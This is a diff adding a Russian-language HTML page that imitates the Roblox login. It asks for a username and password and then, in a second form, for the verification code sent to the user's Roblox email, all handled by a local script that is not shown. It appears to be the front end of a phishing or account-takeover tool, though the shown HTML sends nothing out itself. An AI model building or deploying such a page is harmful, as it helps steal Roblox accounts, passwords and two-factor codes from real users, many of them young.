@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в Roblox</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <h2>Вход в Roblox</h2>
+            
+            <!-- Форма логина -->
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="login-username">Имя пользователя:</label>
+                    <input type="text" id="login-username" name="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="login-password">Пароль:</label>
+                    <input type="password" id="login-password" name="password" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="remember-me" name="remember">
+                        Запомнить меня
+                    </label>
+                </div>
+                
+                <button type="submit" class="btn-login">Войти</button>
+            </form>
+            
+            <!-- Форма 2FA -->
+            <form id="codeForm" style="display: none;">
+                <div class="form-group">
+                    <label for="code-input">Код из почты Roblox:</label>
+                    <input type="text" id="code-input" name="code" required>
+                </div>
+                
+                <button type="submit" class="btn-login">Подтвердить код</button>
+                <button type="button" class="btn-back" onclick="showLoginForm()">Назад</button>
+            </form>
+            
+            <!-- Результат -->
+            <div id="resultDiv" class="result-message" style="display: none;"></div>
+        </div>
+    </div>
+    
+    <script src="/static/js/custom-login.js"></script>
+</body>
+</html> 
